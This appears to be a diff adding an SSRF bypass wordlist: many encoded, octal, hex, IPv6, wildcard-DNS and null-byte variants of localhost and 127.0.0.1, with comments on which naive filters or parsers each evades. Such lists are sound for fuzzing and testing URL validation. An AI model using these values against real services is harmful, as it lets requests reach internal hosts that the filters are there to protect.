@@ -1,0 +1,188 @@
+# Core hostnames
+localhost
+localhost.
+localhost.localdomain
+localhost.localdomain.
+local
+loopback
+ip6-localhost
+ip6-loopback
+
+# IDNA / Punycode (no change for ASCII; included for completeness)
+xn--localhost
+xn--loopback
+
+# Percent-encoded (single)
+local%68ost
+%6cocalhost
+%6c%6f%63%61%6c%68%6f%73%74
+localhost%2e                
+localhost%2Elocaldomain
+
+# Percent-encoded (double-encoded host token)
+%256c%256f%2563%2561%256c%2568%256f%2573%2574
+localhost%252e
+%6c%6f%63%61%6c%68%6f%73%74%2e
+
+# Dot encoded / obfuscated separators
+local%2ehost
+local%2Ehost
+local%2e%68ost
+localhost%2e%20             
+local%2e%2ehost             
+
+# Trailing/leading dots and weird dot width
+.localhost
+localhost.
+.localhost.
+localhost．                  
+localhost｡                   
+
+# Backslash/special char variants (some URL parsers normalize)
+local\host
+localhost\.
+local%5Chost
+localhost%5C
+local%2Fhost                
+
+# Userinfo-like host tokens (as pure token; use when an app naively splits `@`)
+localhost@
+localhost%40
+127.0.0.1@
+127.1@
+
+# Hex-escaped characters inside hostname (not standard but some filters split)
+local%68ost.localdomain
+local%68ost%2Elocaldomain
+
+# IPv4 canonical
+127.0.0.1
+127.0.0.1.
+127.0.0.0
+127.0.1.1
+127.1.1.1
+127.1
+127.0.1
+127.0.0.7
+127.0.53.53
+127.255.255.254
+
+# IPv4 dotted-octal (per-octet)
+0177.0.0.1
+0177.00.00.01
+0177.0.1
+0177.1
+
+# IPv4 dotted-hex (per-octet)
+0x7f.0x0.0x0.0x1
+0x7F.0x00.0x00.0x01
+0x7f.1
+
+# IPv4 single-dword integer
+2130706433                  
+0x7f000001                  
+017700000001                
+
+# Mixed notations
+127.000.000.001             
+127.0.0000001               
+127.1                       
+0x7f.1
+127.000001
+0x7f000001                  
+2130706433                  
+
+# IPv6 loopback
+::1
+::1.
+[::1]
+[0:0:0:0:0:0:0:1]
+0:0:0:0:0:0:0:1
+[::]
+::ffff:127.0.0.1
+[::ffff:127.0.0.1]
+[::FFFF:127.0.0.1]
+
+# IPv6 percent-encoding (host token context)
+%3A%3A1
+%5B%3A%3A1%5D
+%5B%3A%3Affff%3A127.0.0.1%5D
+
+# Hex compress/expand IPv6
+[0000:0000:0000:0000:0000:0000:0000:0001]
+[::0001]
+0:0:0:0:0:0:0:1.
+
+# DNS wildcard services (resolve to 127.0.0.1)
+127.0.0.1.nip.io
+api.127.0.0.1.nip.io
+127.0.0.1.xip.io
+127-0-0-1.sslip.io
+test.127-0-0-1.sslip.io
+127.0.0.1.traefik.me
+127.0.0.1.nip.local
+
+# DNS wildcard variants with trailing dot
+127.0.0.1.nip.io.
+api.127.0.0.1.nip.io.
+127-0-0-1.sslip.io.
+127.0.0.1.traefik.me.
+
+# Percent-encoded labels inside wildcard domains
+127.0.0.1%2Enip.io
+api%2E127.0.0.1.nip.io
+127-0-0-1%2Esslip.io
+
+# Mixed numeric host inside wildcard (some resolvers normalize)
+2130706433.nip.io
+0x7f000001.nip.io
+017700000001.nip.io
+
+# Unicode dot substitutions in wildcard (parser-dependent)
+127.0.0.1﹒nip.io           
+127.0.0.1．nip.io           
+
+# Additional local TLD tricks (environment-dependent)
+localhost.local
+localhost.home
+localhost.lan
+localhost.test
+localhost.invalid
+localhost.localhost        
+
+# Space/tab injections (some broken splitters trim)
+localhost%20
+localhost%09
+127.0.0.1%20
+[::1]%20
+
+# Null byte (legacy/bad parsers)
+localhost%00
+localhost%00.example.com
+127.0.0.1%00
+%00localhost
+
+# Case toggles (DNS case-insensitive, but filters sometimes aren’t)
+LOCALHOST
+LocalHost
+LOCALHOST.LOCALDOMAIN
+NIP.IO domain labels mixed:
+Api.127.0.0.1.Nip.Io
+Test.127-0-0-1.Sslip.Io
+
+# Path-confusion in host token (parser bugs; include cautiously)
+127.0.0.1%2f
+localhost%2f
+127.0.0.1%2F..               
+%5B%3A%3A1%5D%2f
+
+# At-sign encoded in host token (userinfo confusion)
+localhost%40
+127.0.0.1%40
+%31%32%37.0.0.1              
+127.0.0.1%252F               
+
+# Bracketed IPv6 with padding/space-ish
+%5B::1%5D
+%5B%3A%3A0001%5D
+%5B%20%3A%3A1%5D
